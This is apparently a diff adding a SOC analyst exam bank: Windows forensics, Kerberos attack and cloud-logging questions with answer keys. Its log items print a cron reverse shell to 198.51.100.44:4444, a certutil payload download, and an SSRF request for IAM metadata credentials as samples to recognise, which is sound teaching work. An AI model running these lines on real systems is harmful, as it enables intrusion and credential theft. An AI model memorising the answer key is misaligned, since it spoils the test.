@@ -1,0 +1,332 @@
+# SOC L2 Knowledge Exam Bank (server-only: answers never leave the exam service).
+# Every item states an authentic technical fact recorded as "certain" in docs/ops/soc-curriculum-claims.md (rows K23-K45).
+# Objective alignment to any certification is UNVERIFIED until a human reviewer maps it.
+# answer: index of the correct option (mcq, log); indices of every correct option (multi);
+# the correct order of option indices (ordering).
+version: 1
+objectiveAlignment: UNVERIFIED
+status: agent-checked
+items:
+  - id: kb-l2-sigma-syntax
+    type: mcq
+    skill: soc_threat_intel
+    claim: K23
+    stem: "In a Sigma detection rule, which top-level section specifies the data category, product, and service that the query applies to?"
+    options: ["logsource", "detection", "condition", "references"]
+    answer: [0]
+    explanation: "In the Sigma specification, 'logsource' defines the event scope (category, product, service). 'detection' contains the search identifiers, and 'condition' defines the boolean evaluation logic."
+
+  - id: kb-l2-yara-condition
+    type: mcq
+    skill: soc_malware_triage
+    claim: K24
+    stem: "In a YARA rule, which keyword modifier indicates that a string match must be surrounded by non-alphanumeric characters?"
+    options: ["nocase", "wide", "fullword", "ascii"]
+    answer: [2]
+    explanation: "The 'fullword' modifier in YARA requires that the string not be preceded or followed by alphanumeric characters, preventing partial-word false matches."
+
+  - id: kb-l2-prefetch-timestamps
+    type: mcq
+    skill: soc_endpoint_triage
+    claim: K25
+    stem: "On modern Windows systems (Windows 10 and later), how many historical execution timestamps does a Windows Prefetch (.pf) file record?"
+    options: ["1", "4", "8", "16"]
+    answer: [2]
+    explanation: "Windows 10 introduced format changes to Prefetch files (.pf) that store up to 8 historical execution timestamps, compared to only 1 in Windows XP and earlier."
+
+  - id: kb-l2-shimcache-features
+    type: mcq
+    skill: soc_endpoint_triage
+    claim: K26
+    stem: "Which of the following execution artifacts does Windows AppCompatCache (Shimcache) NOT record?"
+    options: ["Execution run count", "File full path", "Last modified timestamp", "File size"]
+    answer: [0]
+    explanation: "Shimcache tracks binary existence, path, file size, and the file's last modified timestamp, but does NOT track execution count or the exact time of execution."
+
+  - id: kb-l2-amcache-hash
+    type: mcq
+    skill: soc_endpoint_triage
+    claim: K27
+    stem: "Which cryptographic hash algorithm is historically calculated and stored for executed binaries within the Windows Amcache.hve registry hive?"
+    options: ["MD5", "SHA-1", "SHA-256", "SHA-512"]
+    answer: [1]
+    explanation: "The Windows Amcache.hve hive records binary execution metadata including the SHA-1 hash of the file header (FileKey / FileId), compilation timestamp, and full path."
+
+  - id: kb-l2-kerberoast-mechanism
+    type: mcq
+    skill: soc_credential_attacks
+    claim: K28
+    stem: "What Active Directory attribute must be present on a user account for an attacker to request a Kerberos service ticket for Kerberoasting (T1558.003)?"
+    options: ["ServicePrincipalName", "userAccountControl", "adminCount", "msDS-KeyVersionNumber"]
+    answer: [0]
+    explanation: "Kerberoasting targets user accounts that have a ServicePrincipalName (SPN) defined. Any domain user can request a TGS ticket for an SPN and crack the ticket offline."
+
+  - id: kb-l2-kerberoast-event
+    type: log
+    skill: soc_credential_attacks
+    claim: K28
+    stem: "Analyze this Windows Security log snippet. What attack is indicated by this ticket request?"
+    log: "EventID: 4769\nService Name: SQLServiceAccount\nService ID: S-1-5-21-392841-482910-1004\nTicket Options: 0x40810000\nTicket Encryption Type: 0x17\nStatus: 0x0"
+    options: [
+      "Kerberoasting attack requesting an RC4-encrypted TGS ticket",
+      "AS-REP roasting request for preauthentication bypass",
+      "Pass-the-Hash logon attempt using NTLM network authentication",
+      "Golden Ticket creation on the Domain Controller"
+    ]
+    answer: [0]
+    explanation: "Event 4769 indicates a Kerberos service ticket (TGS) was requested. Ticket Encryption Type 0x17 (RC4-HMAC) for a user service account is a primary signature of Kerberoasting, as attackers request legacy RC4 ciphers to speed up offline cracking."
+
+  - id: kb-l2-asrep-roast
+    type: mcq
+    skill: soc_credential_attacks
+    claim: K29
+    stem: "Which Active Directory account configuration allows an attacker to conduct AS-REP Roasting (T1558.004) without possessing any domain credentials?"
+    options: [
+      "Do not require Kerberos preauthentication (DONT_REQ_PREAUTH)",
+      "Account is sensitive and cannot be delegated",
+      "Use Kerberos DES encryption types for this account",
+      "Password never expires (DONT_EXPIRE_PASSWORD)"
+    ]
+    answer: [0]
+    explanation: "When an account has 'Do not require Kerberos preauthentication' set (UF_DONT_REQ_PREAUTH in userAccountControl), anyone can send a KRB_AS_REQ and receive a KRB_AS_REP encrypted with the user's password hash, crackable offline."
+
+  - id: kb-l2-pth-ntlm
+    type: mcq
+    skill: soc_credential_attacks
+    claim: K30
+    stem: "In a Pass-the-Hash attack (T1550.002), what credential component is passed across the network to authenticate to a remote service?"
+    options: [
+      "The raw NTLM password hash",
+      "The plaintext password",
+      "A forged Kerberos TGT",
+      "The LanMan (LM) hash only"
+    ]
+    answer: [0]
+    explanation: "Pass-the-Hash relies on the NTLM authentication protocol design, which uses the NTLM hash of the password rather than the plaintext password to generate the challenge-response."
+
+  - id: kb-l2-golden-ticket
+    type: mcq
+    skill: soc_credential_attacks
+    claim: K31
+    stem: "Which key or secret is required to forge a Kerberos Golden Ticket (T1558.001) in an Active Directory forest?"
+    options: [
+      "The KRBTGT account password hash or AES key",
+      "The Domain Controller machine account password",
+      "The Enterprise Administrator plaintext password",
+      "The target file server machine account key"
+    ]
+    answer: [0]
+    explanation: "A Golden Ticket is a forged Ticket Granting Ticket (TGT). Because TGTs are encrypted and signed by the KRBTGT service account key, possessing the KRBTGT hash or AES key enables forging tickets with arbitrary privileges."
+
+  - id: kb-l2-silver-ticket
+    type: mcq
+    skill: soc_credential_attacks
+    claim: K32
+    stem: "Unlike a Golden Ticket, what is a key architectural characteristic of a Silver Ticket attack?"
+    options: [
+      "It requires no communication with the Domain Controller and targets a specific service",
+      "It generates a valid TGT accepted by every server in the forest",
+      "It requires compromising the KRBTGT account password hash",
+      "It operates exclusively over Kerberos UDP port 88"
+    ]
+    answer: [0]
+    explanation: "A Silver Ticket is a forged Service Ticket (TGS). It is encrypted with the specific service's computer account password hash. Because the target service validates the ticket locally without checking with the DC, no DC communication occurs."
+
+  - id: kb-l2-bloodhound-graph
+    type: mcq
+    skill: soc_threat_intel
+    claim: K33
+    stem: "What primary mechanism does the BloodHound tool use to identify Active Directory attack paths?"
+    options: [
+      "Graph theory analysis of AD permissions, object ACLs, and group memberships",
+      "Port scanning and banner grabbing against all internal servers",
+      "Brute force password spraying against domain accounts",
+      "Automated extraction of LSASS memory across domain workstations"
+    ]
+    answer: [0]
+    explanation: "BloodHound models Active Directory domain objects, trust relationships, user memberships, and Access Control Lists (ACLs) as nodes and edges in a graph database to identify multi-hop escalation paths."
+
+  - id: kb-l2-process-injection
+    type: mcq
+    skill: soc_endpoint_triage
+    claim: K34
+    stem: "Which process injection technique involves spawning a legitimate process in a suspended state, hollowing out its original executable sections, and writing malicious code in its place?"
+    options: [
+      "Process Hollowing",
+      "DLL Side-Loading",
+      "Thread Local Storage (TLS) Callback",
+      "AppCert DLL Injection"
+    ]
+    answer: [0]
+    explanation: "Process Hollowing (sub-technique of T1055) unmaps (ZwUnmapViewOfSection) the genuine code from a suspended target process and replaces it with shellcode or a malicious PE payload before resuming execution."
+
+  - id: kb-l2-lolbas-certutil
+    type: log
+    skill: soc_endpoint_triage
+    claim: K35
+    stem: "What action is being performed by this LOLBAS command line?"
+    log: "certutil.exe -urlcache -split -f https://example.com/assets/beacon.bin C:\\Users\\Public\\update.exe"
+    options: [
+      "Downloading a remote file over HTTP to disk to bypass perimeter filters",
+      "Exporting a trusted root certificate from the local machine store",
+      "Splitting a local digital certificate into public and private key files",
+      "Checking the online CRL status of a remote website"
+    ]
+    answer: [0]
+    explanation: "Attackers abuse Windows certutil.exe with the `-urlcache -split -f` parameters as a Living off the Land download utility to fetch arbitrary payloads from external URLs."
+
+  - id: kb-l2-volatility-malfind
+    type: mcq
+    skill: soc_endpoint_triage
+    claim: K36
+    stem: "In Volatility memory forensics, what memory condition does the `malfind` plugin primarily search for?"
+    options: [
+      "Memory pages with PAGE_EXECUTE_READWRITE permissions not backed by a file on disk",
+      "Unlinked processes in the ActiveProcessLinks doubly-linked list",
+      "Kernel drivers lacking a valid Microsoft digital signature",
+      "Terminated processes that still have open network socket handles"
+    ]
+    answer: [0]
+    explanation: "The `malfind` plugin flags virtual memory ranges with write and execute permissions (PAGE_EXECUTE_READWRITE) where the memory region is unmapped (VadS) and contains executable PE or shellcode headers."
+
+  - id: kb-l2-volatility-psscan
+    type: mcq
+    skill: soc_endpoint_triage
+    claim: K36
+    stem: "Why would a forensic analyst use the Volatility `psscan` plugin instead of `pslist`?"
+    options: [
+      "psscan finds unlinked processes by scanning for EPROCESS pool tags, detecting rootkits",
+      "psscan runs much faster because it only reads the pagefile",
+      "pslist cannot display process command lines on 64-bit systems",
+      "psscan displays network connections while pslist only shows threads"
+    ]
+    answer: [0]
+    explanation: "While `pslist` follows the ActiveProcessLinks doubly-linked list in the OS kernel, rootkits can unlink themselves (Direct Kernel Object Manipulation). `psscan` scans raw memory pools for EPROCESS signatures, finding unlinked hidden processes."
+
+  - id: kb-l2-memory-acquisition
+    type: ordering
+    skill: soc_incident_response
+    claim: K37
+    stem: "According to RFC 3227, arrange these evidence sources in order of volatility from most volatile (1) to least volatile (4):"
+    options: [
+      "Registers and CPU cache",
+      "Routing table, ARP cache, and process memory",
+      "Temporary file systems and disk swap",
+      "Archival media, optical disks, and backup printouts"
+    ]
+    answer: [0, 1, 2, 3]
+    explanation: "RFC 3227 specifies the order of volatility: registers/cache first, followed by network routing/ARP/RAM, then local disk storage/temp files, and finally archival backups."
+
+  - id: kb-l2-linux-persistence-cron
+    type: log
+    skill: soc_linux_logs
+    claim: K38
+    stem: "Analyze this entry found in `/var/spool/cron/crontabs/root`. What does this persistence mechanism execute?"
+    log: "*/10 * * * * /bin/bash -c 'exec 5<>/dev/tcp/198.51.100.44/4444;cat <&5 | while read line; do $line 2>&5 >&5; done'"
+    options: [
+      "A recurring reverse bash TCP shell to 198.51.100.44 every 10 minutes",
+      "A scheduled backup of the /var/spool directory every 10 hours",
+      "An automated NTP synchronization query across port 4444",
+      "A local health check validating the availability of port 4444"
+    ]
+    answer: [0]
+    explanation: "The cron syntax `*/10 * * * *` runs every 10 minutes, executing a standard pure-bash interactive reverse shell redirected through TCP port 4444 to destination IP 198.51.100.44."
+
+  - id: kb-l2-linux-profile-vol
+    type: mcq
+    skill: soc_linux_logs
+    claim: K39
+    stem: "What two essential files are bundled to create a custom Volatility 2 profile for an acquired Linux memory dump?"
+    options: [
+      "Kernel debug symbols (module.dwarf) and the kernel symbol table (System.map)",
+      "The /etc/passwd file and the loaded kernel module list (/proc/modules)",
+      "The initramfs image and the bootloader configuration (/boot/grub.cfg)",
+      "The Linux distribution release file and the sysctl configuration"
+    ]
+    answer: [0]
+    explanation: "Volatility Linux profiles require a dwarf file containing data structure definitions generated via dwarfdump from kernel headers, paired with the System.map kernel symbol table."
+
+  - id: kb-l2-cloudtrail-persistence
+    type: mcq
+    skill: soc_cloud_identity
+    claim: K40
+    stem: "Which AWS CloudTrail management event represents the creation of new static programmatic credentials for an IAM user?"
+    options: [
+      "CreateAccessKey",
+      "AssumeRoleWithSAML",
+      "GetSessionToken",
+      "CreateLoginProfile"
+    ]
+    answer: [0]
+    explanation: "The AWS IAM API action `CreateAccessKey` generates a new Access Key ID and Secret Access Key for an IAM user, a frequent technique used by adversaries to establish persistent programmatic access."
+
+  - id: kb-l2-nist-scoping
+    type: mcq
+    skill: soc_incident_response
+    claim: K41
+    stem: "In NIST SP 800-61 incident response guidelines, why is thorough scoping conducted before implementing host containment?"
+    options: [
+      "To identify all compromised hosts and persistence channels so the adversary cannot pivot or re-enter",
+      "To calculate the exact financial penalty owed to regulatory authorities",
+      "Because containment actions require prior written approval from the attacker",
+      "To avoid having to preserve volatile forensic evidence on workstations"
+    ]
+    answer: [0]
+    explanation: "Premature containment of a single identified host alerts the adversary and allows them to maintain footholds or accelerate exfiltration on other undiscovered compromised systems across the network."
+
+  - id: kb-l2-lateral-movement-ports
+    type: multi
+    skill: soc_network_monitoring
+    claim: K42
+    stem: "Select all network services and default ports commonly exploited for Windows lateral movement across internal corporate networks:"
+    options: [
+      "Server Message Block (SMB) on TCP 445",
+      "Windows Remote Management (WinRM) on TCP 5985/5986",
+      "Remote Desktop Protocol (RDP) on TCP 3389",
+      "Simple Network Management Protocol (SNMP) on UDP 161"
+    ]
+    answer: [0, 1, 2]
+    explanation: "SMB (port 445 via PsExec/Named Pipes), WinRM (port 5985/5986 via PowerShell remoting), and RDP (port 3389) are standard Windows administrative protocols frequently leveraged for lateral movement. SNMP is a network monitoring protocol."
+
+  - id: kb-l2-stix-taxii
+    type: mcq
+    skill: soc_threat_intel
+    claim: K43
+    stem: "In cyber threat intelligence sharing frameworks, what is the fundamental distinction between STIX and TAXII?"
+    options: [
+      "STIX is the structured JSON language for threat information; TAXII is the protocol for exchanging it",
+      "STIX is an intrusion detection system; TAXII is a firewall management application",
+      "STIX is proprietary to Microsoft; TAXII is an open-source Linux kernel module",
+      "STIX operates over raw UDP sockets; TAXII requires encrypted IPsec tunnels"
+    ]
+    answer: [0]
+    explanation: "STIX (Structured Threat Information Expression) defines the standardized data format and JSON schemas for threat representations. TAXII (Trusted Automated Exchange of Intelligence Information) is the transport protocol over HTTPS."
+
+  - id: kb-l2-etw-ti
+    type: mcq
+    skill: soc_endpoint_triage
+    claim: K44
+    stem: "What is the primary role of the Microsoft-Windows-Threat-Intelligence Event Tracing for Windows (ETW) provider in enterprise detection?"
+    options: [
+      "Provides kernel-level telemetry regarding memory injection, thread creation, and process manipulation to early-launch anti-malware (ELAM) drivers",
+      "Scans network packet payloads arriving on external web application interfaces",
+      "Enforces Active Directory password complexity and expiration policies",
+      "Compresses and archives historical security audit logs to local disk"
+    ]
+    answer: [0]
+    explanation: "The Microsoft-Windows-Threat-Intelligence ETW provider is a protected kernel-level telemetry source accessible only to PPL (Protected Process Light) antimalware drivers, exposing events like process hollowing and memory manipulation."
+
+  - id: kb-l2-ssrf-metadata
+    type: log
+    skill: soc_web_attacks
+    claim: K45
+    stem: "Analyze this HTTP request log line. What web vulnerability and exploitation target is indicated?"
+    log: "GET /proxy.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1 200 421"
+    options: [
+      "Server-Side Request Forgery (SSRF) targeting cloud instance metadata to steal IAM role credentials",
+      "Cross-Site Scripting (XSS) attempting to execute JavaScript in an administrator browser",
+      "Directory traversal attempting to read /etc/shadow from the local web server",
+      "Blind SQL injection querying database version schemas"
+    ]
+    answer: [0]
+    explanation: "The query abuses the proxy parameter to force the server to query the link-local cloud metadata address (169.254.169.254), attempting to extract IAM temporary security credentials (SSRF, ATT&CK T1552.005)."
